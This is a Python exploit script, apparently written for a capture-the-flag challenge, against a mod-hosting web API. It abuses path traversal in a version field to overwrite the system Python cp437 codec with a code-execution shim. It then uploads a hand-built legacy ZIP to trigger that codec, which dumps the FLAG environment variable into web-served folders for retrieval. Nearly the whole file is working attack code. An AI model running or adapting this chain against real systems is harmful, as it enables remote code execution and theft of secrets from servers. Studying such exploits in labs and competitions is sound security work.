#!/usr/bin/env python3
"""
_t43_usrlib_cp437.py
Strategy:
1. Overwrite /usr/lib/python3.11/encodings/cp437.py with RCE shim
2. Trigger zip upload with ASCII filename (forces cp437 codec lookup)
3. Check if the codec was loaded from /usr/lib or /usr/local

Path: mv='../../../../usr/lib' (19) + pc='python3.11/encodings' (20) = /usr/lib/python3.11/encodings/
"""
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh_user():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_platform(tok, code):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    items = r.get("results", r) if isinstance(r, dict) else r
    for it in (items or []):
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    return requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": "z"}, timeout=15).json()["id"]

OUT = "flag_" + secrets.token_hex(4) + ".txt"
SHIM = (
    "import os as _o\n"
    "try:\n"
    f"    open('/usr/share/nginx/html/{OUT}','w').write(_o.environ.get('FLAG','NOFLAG')+'\\n')\n"
    "except Exception: pass\n"
    "try:\n"
    f"    open('/data/media/{OUT}','w').write(_o.environ.get('FLAG','NOFLAG')+'\\n')\n"
    "except Exception: pass\n"
)

# Probe marker to check if /usr/lib cp437 is actually used
PROBE = "x = 'from_usrlib_python311_encodings_cp437'\n" + SHIM

print(f"[*] Target: {BASE}")
print(f"[*] Output file: {OUT}")

# STEP 1: Plant cp437.py in /usr/lib/python3.11/encodings/
tok1, _ = fresh_user()
pid1 = get_or_create_platform(tok1, "python3.11/encodings")  # 20 chars exactly!
mid1 = requests.post(f"{BASE}/api/mods/", headers=H(tok1),
    json={"title":"z","mod_version":"../../../../usr/lib","release_notes":"","is_enabled":True}, timeout=15).json()["id"]
bid1 = requests.post(f"{BASE}/api/mods/{mid1}/builds/", headers=H(tok1),
    json={"platform": pid1}, timeout=15).json()["id"]

bio1 = io.BytesIO()
with zipfile.ZipFile(bio1, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("cp437.py", PROBE.encode())
bio1.seek(0)
r1 = requests.post(f"{BASE}/api/mods/{mid1}/builds/{bid1}/upload/", headers=H(tok1),
    files={"zip_file": ("p.zip", bio1, "application/zip")}, timeout=30)
print(f"[*] Plant /usr/lib/python3.11/encodings/cp437.py -> {r1.status_code}")

# STEP 2: Trigger cp437 codec lookup
# Upload a zip with ASCII filename, no UTF-8 flag set
# Python zipfile will try to decode the filename with cp437
tok2, _ = fresh_user()
pid2 = get_or_create_platform(tok2, "trigger")
mid2 = requests.post(f"{BASE}/api/mods/", headers=H(tok2),
    json={"title":"z","mod_version":"v_trigger","release_notes":"","is_enabled":True}, timeout=15).json()["id"]
bid2 = requests.post(f"{BASE}/api/mods/{mid2}/builds/", headers=H(tok2),
    json={"platform": pid2}, timeout=15).json()["id"]

# Create zip with ASCII filename, NO UTF-8 flag (legacy zip)
# Use raw zipfile construction to avoid UTF-8 flag
import struct

# Build a minimal valid ZIP with ASCII filename, flag=0 (no UTF-8)
def make_legacy_zip(filename_ascii: bytes, content: bytes) -> bytes:
    """Create a ZIP file where filename is in ASCII/cp437, NOT UTF-8 flagged"""
    import struct, time, zlib
    now = time.localtime()
    dt = (now.tm_year - 1980) << 9 | now.tm_mon << 5 | now.tm_mday
    tm = now.tm_hour << 11 | now.tm_min << 5 | now.tm_sec // 2
    
    compressed = zlib.compress(content)[2:-4]  # strip zlib header/trailer
    crc = zlib.crc32(content)
    
    # Local file header
    lfh = struct.pack('<4s2B4HL2L2H',
        b'PK\x03\x04',  # signature
        20, 0,           # version needed, version made
        0,               # general purpose flags (0 = no UTF-8!)
        8,               # compression method (DEFLATE)
        tm, dt,          # time, date
        crc,             # CRC-32
        len(compressed), # compressed size
        len(content),    # uncompressed size
        len(filename_ascii), 0  # filename length, extra length
    )
    local = lfh + filename_ascii + compressed
    
    # Central directory record
    offset = 0
    cdr = struct.pack('<4s4B4HL2L5H2L',
        b'PK\x01\x02',   # signature
        20, 0, 20, 0,     # version made, version needed
        0,                # general purpose flags (0 = no UTF-8!)
        8,                # compression method
        tm, dt,
        crc,
        len(compressed),
        len(content),
        len(filename_ascii), 0, 0, 0, 0,  # fn len, extra, comment, disk, int attrs
        0,                # ext attrs
        offset            # local header offset
    )
    cdr += filename_ascii
    
    # End of central directory
    eocd = struct.pack('<4s4H2LH',
        b'PK\x05\x06',
        0, 0, 1, 1,
        len(cdr),
        len(local),
        0
    )
    return local + cdr + eocd

# Create a zip with ASCII filename "hello.txt" (no UTF-8 flag)
legacy_zip = make_legacy_zip(b"hello.txt", b"trigger cp437 codec")
bio2 = io.BytesIO(legacy_zip)

# Verify it's valid
try:
    with zipfile.ZipFile(bio2) as zf:
        names = zf.namelist()
        print(f"[*] Legacy zip valid, entries: {names}")
    bio2.seek(0)
except Exception as e:
    print(f"[!] ZIP error: {e}")
    # Fallback: use regular zip  
    bio2 = io.BytesIO()
    with zipfile.ZipFile(bio2, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("hello.txt", b"trigger")
    bio2.seek(0)

r2 = requests.post(f"{BASE}/api/mods/{mid2}/builds/{bid2}/upload/", headers=H(tok2),
    files={"zip_file": ("trigger.zip", bio2, "application/zip")}, timeout=30)
print(f"[*] Upload legacy zip (cp437 trigger) -> {r2.status_code}")

time.sleep(2)

# Check results
print("\n[*] Checking outputs...")
for url, label in [(f"{BASE}/{OUT}", "nginx"), (f"{BASE}/media/{OUT}", "media")]:
    r3 = requests.get(url, timeout=10)
    print(f"  {label}: {r3.status_code}", end="")
    if r3.status_code == 200:
        m = re.search(r"PTITCTF\{[^}]+\}", r3.text)
        print(f" | {r3.text[:80]}", end="")
        if m:
            print(f"\n\n>>> FLAG: {m.group(0)}")
    print()
